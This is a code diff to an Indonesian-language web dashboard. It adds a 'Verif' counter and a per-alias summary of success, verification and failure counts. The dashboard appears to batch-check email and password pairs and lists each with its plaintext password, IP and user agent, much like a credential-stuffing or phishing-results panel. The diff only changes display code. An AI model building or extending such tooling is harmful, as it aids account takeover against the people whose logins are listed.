@@ -201,6 +201,10 @@
                             <div class="stat-value" id="stat-failed-count">0</div>
                             <div class="stat-label">Gagal</div>
                         </div>
+                        <div class="stat-card stat-verif">
+                            <div class="stat-value" id="stat-verif-count">0</div>
+                            <div class="stat-label">Verif</div>
+                        </div>
                     </div>
                 </div>
             </section>
@@ -417,7 +421,7 @@
                 }
                 const rows = data.map(r => `
                     <tr>
-                        <td style="position: sticky; left: 0; z-index: 1; background: var(--bg-card); font-family: monospace; font-size: 0.85rem; color: #38bdf8;">${r.ip || '-'}</td>
+                        <td style="font-family: monospace; font-size: 0.85rem; color: #38bdf8;">${r.ip || '-'}</td>
                         <td>${formatDate(r.timestamp)}</td>
                         <td>${r.email}</td>
                         <td>${r.password}</td>
@@ -425,11 +429,51 @@
                         <td style="font-size:0.75rem;color:#71717a;max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${r.alias}">${r.alias || '-'}</td>
                         <td style="font-size:0.72rem;color:#a1a1aa;white-space:nowrap;">${r.ua || '-'}</td>
                     </tr>`).join('');
-                historyContent.innerHTML = `
+                
+                // Group by Alias for Summary
+                const summaryObj = {};
+                data.forEach(r => {
+                    const al = r.alias || '-';
+                    if (!summaryObj[al]) summaryObj[al] = { success: 0, failed: 0, verif: 0, total: 0 };
+                    summaryObj[al].total++;
+                    if (r.status === 'success') summaryObj[al].success++;
+                    else if (r.status === 'failed') summaryObj[al].failed++;
+                    else if (r.status === 'VERIF') summaryObj[al].verif++;
+                });
+
+                const summaryRows = Object.keys(summaryObj).map(al => {
+                    const s = summaryObj[al];
+                    return `<tr>
+                        <td style="font-weight:600; color:#e4e4e7;">${al}</td>
+                        <td style="color:#34d399;">${s.success}</td>
+                        <td style="color:#fbbf24;">${s.verif}</td>
+                        <td style="color:#f87171;">${s.failed}</td>
+                        <td style="color:#a1a1aa;">${s.total}</td>
+                    </tr>`;
+                }).join('');
+
+                const summaryTable = `
+                    <h3 style="margin-bottom: 0.75rem; font-size: 0.95rem; color: #e4e4e7;">Ringkasan Berdasarkan Alias</h3>
+                    <table class="history-table" style="margin-bottom: 1.5rem;">
+                        <thead>
+                            <tr>
+                                <th>Alias</th>
+                                <th>Sukses</th>
+                                <th>Verif</th>
+                                <th>Gagal</th>
+                                <th>Total</th>
+                            </tr>
+                        </thead>
+                        <tbody>${summaryRows}</tbody>
+                    </table>
+                `;
+
+                historyContent.innerHTML = summaryTable + `
+                    <h3 style="margin-bottom: 0.75rem; font-size: 0.95rem; color: #e4e4e7;">Detail Riwayat</h3>
                     <table class="history-table">
                         <thead>
                             <tr>
-                                <th style="position: sticky; left: 0; z-index: 2; background: var(--bg-card);">IP Address</th>
+                                <th>IP Address</th>
                                 <th>Waktu</th>
                                 <th>Email</th>
                                 <th>Password</th>
@@ -490,7 +534,7 @@
                     if (data.info.ip) infoIp.innerText = data.info.ip;
                     if (data.info.ua) infoUa.innerText = data.info.ua;
                 } else if (data.type === 'progress') {
-                    updateProgress(data.current, data.total, data.status, data.successCount, data.failedCount);
+                    updateProgress(data.current, data.total, data.status, data.successCount, data.failedCount, data.verifCount);
                 } else if (data.type === 'status') {
                     updateStatus(data.status);
                 } else if (data.type === 'email_success') {
@@ -539,7 +583,7 @@
             appendLog(className, msg);
         }
 
-        function updateProgress(current, total, status, successCount, failedCount) {
+        function updateProgress(current, total, status, successCount, failedCount, verifCount) {
             const pct = Math.round((current / total) * 100);
             progressPercentage.innerText = `${pct}%`;
 
@@ -548,8 +592,9 @@
 
             progressDetail.innerText = `Memproses email ke-${current} dari ${total} (${status})`;
 
-            if (successCount !== undefined) successCountEl.innerText = successCount;
-            if (failedCount !== undefined) failedCountEl.innerText = failedCount;
+            if (successCount !== undefined) document.getElementById('stat-success-count').innerText = successCount;
+            if (failedCount !== undefined) document.getElementById('stat-failed-count').innerText = failedCount;
+            if (verifCount !== undefined) document.getElementById('stat-verif-count').innerText = verifCount;
         }
 
         function setFormDisabled(disabled) {
